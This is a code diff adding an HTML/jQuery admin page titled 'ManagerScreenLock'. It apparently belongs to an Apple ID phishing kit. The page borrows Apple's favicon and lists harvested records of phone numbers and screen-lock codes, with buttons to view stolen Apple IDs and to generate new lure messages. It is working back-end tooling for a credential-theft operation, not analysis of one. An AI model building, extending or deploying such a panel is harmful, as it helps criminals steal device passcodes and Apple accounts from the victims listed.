@@ -1,0 +1,94 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+    <meta http-equiv="X-UA-Compatible" content="ie=edge"/>
+    <link rel="shortcut icon" type="image/x-icon" href="https://appleid.cdn-apple.com/static/bin/cb3606853004/images/favicon.ico">
+    <script>
+        (()=>{if (window.location.href.match(/\/delete\/\w/)){
+                window.location.replace("/AppleID/lockpass");
+            };})()
+    </script>
+    <meta http-equiv="refresh" content="3">
+    <title>ManagerScreenLock</title>
+    <!-- <link rel="stylesheet" href="./static/css/manager.css"> -->
+    <script type="text/plain" id="template">
+        <tr class="row">
+            <td class="col-md-2"></td>
+            <td class="col-md-1">{id}</td>
+            <td class="col-md-3">{phone}</td>
+            <td class="col-md-2">{slock}</td>
+            <td class="col-md-2"><a href="/AppleID/delete/lock/{id}"><button class="btn btn-danger">删除记录</button></a></td>
+            <td class="col-md-2"></td>
+        </tr>
+    </script>
+    <script src="/AppleID/js/jquery-3.3.1.min.js"></script>
+    <link rel="stylesheet" href="/AppleID/bootstrap/css/bootstrap.min.css"/>
+    <script src="/AppleID/bootstrap/js/bootstrap.min.js"></script>
+    <script>
+        $(()=>{
+            $("#send").on("click",(e)=>{
+                window.location.replace("/AppleID/sendmessage");
+            })
+            $("#appleID").on("click",(e)=>{
+                window.location.replace("/AppleID/charger")
+            })
+            $.ajax({
+                url:"/AppleID/lock/all",
+                type:"get",
+                success:(data)=>{
+                    for(index in data){
+                        var template = $("#template").html();
+                        for(item in data[index]){
+                            template = template.replace("{"+item+"}",data[index][item]);
+                        }
+                        template = template.replace("{id}",data[index]["id"]);
+                        $("#tb1").append(template);
+                        $("tr").css("backgroundColor","#aaa");
+                        $("tr:odd").css("backgroundColor","#eee");
+                        $("tr:first").css("backgroundColor","transparent");
+                        $("tr:eq(1)").css("backgroundColor","orange");
+                    }
+                }
+            })
+                $("tr").css("backgroundColor","#aaa");
+                $("tr:odd").css("backgroundColor","#eee");
+                $("tr:first").css("backgroundColor","transparent");
+                $("tr:eq(1)").css("backgroundColor","orange");
+        })
+    </script>
+    <style>
+        body{
+            background-image:url(/AppleID/img/loginbg.png);
+        }
+        h2{
+            color: #fff;
+        }
+    </style>
+</head>
+<body>
+    <center>
+        <h2>管理员操作</h2>
+    </center>
+    <table class="container" id="tb1">
+        <tr class="row">
+            <td class="col-md-2">
+                <button id="appleID" class="btn btn-info">查看AppleID</button>
+            </td>
+            <td class="col-md-7"></td>
+            <td class="col-md-3">
+                <button id="send" class="btn btn-info">生成一条新信息</button>
+            </td>
+        </tr>
+        <tr class="row">
+            <td class="col-md-2"></td>
+            <td class="col-md-1">编号</td>
+            <td class="col-md-3">手机</td>
+            <td class="col-md-2">锁屏</td>
+            <td class="col-md-2">操作</td>
+            <td class="col-md-2"></td>
+        </tr>
+    </table>
+</body>
+</html>
